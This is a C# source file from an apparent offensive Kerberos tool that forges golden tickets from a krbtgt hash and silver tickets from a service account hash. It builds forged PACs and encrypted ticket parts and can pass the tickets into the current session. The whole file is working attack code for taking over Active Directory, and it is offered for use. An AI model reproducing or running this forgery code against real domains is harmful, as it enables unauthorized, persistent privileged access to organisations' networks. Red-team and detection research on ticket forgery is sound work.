using System;
using Kerberos.NET.Crypto;
using Kerberos.NET.Entities;


namespace KerberosRun
{
    class BuildTicket
    {
        //If the decryption routines detect a modification of the ticket, the KRB_AP_ERR_MODIFIED error message is returned.

        public static KrbTicket BuildGolden(string krbtgtHash, EncryptionType etype, string username, string realm, int userid, string domainsid,
            bool ptt = false, bool verbose = false)
        {
            var now = DateTime.UtcNow.AddTicks(-(DateTime.Now.Ticks % TimeSpan.TicksPerSecond));

            Console.WriteLine("\n[*] Building Golden Ticket ...");

            var krbtgtCred = new KerberosHashCreds("krbtgt", krbtgtHash, etype);

            var authData = Pac.generatePac(username, domainsid, realm, krbtgtCred.CreateKey(), now, userid);

            //Arbitrary session key
            var sessionKey = KrbEncryptionKey.Generate(EncryptionType.RC4_HMAC_NT);

            KrbEncTicketPart encTicket = new KrbEncTicketPart()
            {
                AuthTime = now,
                StartTime = now,
                //Ticket Expiration time (valid for 10 hours)
                EndTime = now.AddHours(10),
                RenewTill = now.AddDays(7),
                CRealm = realm,
                CName = new KrbPrincipalName()
                {
                    Type = PrincipalNameType.NT_PRINCIPAL,
                    Name = new[] { username }
                },
                Flags = //TicketFlags.EncryptedPreAuthentication |
                TicketFlags.PreAuthenticated |
                TicketFlags.Initial |
                TicketFlags.Renewable |
                TicketFlags.Forwardable,
                AuthorizationData = authData,
                CAddr = null,
                Key = sessionKey,
                Transited = new KrbTransitedEncoding(),
                
            };

            var encData = KrbEncryptedData.Encrypt(
                encTicket.EncodeApplication(),
                krbtgtCred.CreateKey(),
                KeyUsage.Ticket);

            //encData.KeyVersionNumber = 2;

            var goldenTicket = new KrbTicket()
            {
                TicketNumber = 5,
                Realm = realm,
                SName = new KrbPrincipalName
                    {
                        Type = PrincipalNameType.NT_SRV_INST,
                        Name = new[] { "krbtgt", realm }
                    },
                EncryptedPart = encData,
            };


            

            if (verbose)
            {

                var de = goldenTicket.EncryptedPart.Decrypt
                                (krbtgtCred.CreateKey(),
                                KeyUsage.Ticket,
                                b => KrbEncTicketPart.DecodeApplication(b));

                Console.WriteLine("[*] Decrypting Golden Ticket ...");
                Displayer.PrintTicketEnc(de);
            }

            Console.WriteLine("[*] Now you have a Golden Ticket!");



            var kirbiTGT = Kirbi.GetKirbi(goldenTicket, krbtgtHash, etype, ptt, verbose);
            
            Console.WriteLine("[+] Done! Now enjoy your ticket.");

            return goldenTicket;


        }





        public static KrbTicket BuildSliver(string srvName, string srvHash, EncryptionType etype, string username, string realm, string service, string domainsid,
            bool ptt = false, bool verbose = false)
        {
            var now = DateTime.UtcNow.AddTicks(-(DateTime.Now.Ticks % TimeSpan.TicksPerSecond));

            Console.WriteLine("\n[*] Building Sliver Ticket ...");

            var srvCred = new KerberosHashCreds(srvName, srvHash, etype);

            var authData = Pac.generatePac(username, domainsid, realm, srvCred.CreateKey(), now);


            //Arbitrary session key
            var sessionKey = KrbEncryptionKey.Generate(EncryptionType.RC4_HMAC_NT);

            KrbEncTicketPart encTicket = new KrbEncTicketPart()
            {
                AuthTime = now,
                StartTime = now,
                //Ticket Expiration time (valid for 10 hours)
                EndTime = now.AddHours(10),
                RenewTill = now.AddDays(7),
                CRealm = realm,
                CName = new KrbPrincipalName()
                {
                    Type = PrincipalNameType.NT_PRINCIPAL,
                    Name = new[] { username }
                },
                Flags = //TicketFlags.EncryptedPreAuthentication |
                TicketFlags.PreAuthenticated |
                TicketFlags.Initial |
                TicketFlags.Renewable |
                TicketFlags.Forwardable,
                AuthorizationData = authData,
                CAddr = null,
                Key = sessionKey,
                Transited = new KrbTransitedEncoding(),

            };

            var encData = KrbEncryptedData.Encrypt(
                encTicket.EncodeApplication(),
                srvCred.CreateKey(),
                KeyUsage.Ticket);

            //encData.KeyVersionNumber = 2;

            string srvHost = null;
            if (srvName.Contains("$"))
            {
                srvHost = srvName.Replace("$", string.Empty) + "." + realm;
            }
            else
            {
                srvHost = srvName;
            }
            var sliverTicket = new KrbTicket()
            {
                TicketNumber = 5,
                Realm = realm,
                SName = new KrbPrincipalName
                {
                    Type = PrincipalNameType.NT_SRV_INST,
                    Name = new[] { service, srvHost }
                },
                EncryptedPart = encData,
            };




            if (verbose)
            {
                var de = sliverTicket.EncryptedPart.Decrypt
                                (srvCred.CreateKey(),
                                KeyUsage.Ticket,
                                b => KrbEncTicketPart.DecodeApplication(b));

                Console.WriteLine("   * [Decrypted SliverTicket Ticket]:");
                Displayer.PrintTicketEnc(de);
            }



            Console.WriteLine("[*] Now you have a Sliver Ticket!");

            var kirbiTGT = Kirbi.GetKirbi(sliverTicket, srvName, srvHash, etype, service, ptt, verbose);

            
            Console.WriteLine("[+] Done! Now enjoy your ticket.");

            return sliverTicket;


        }



    }
}
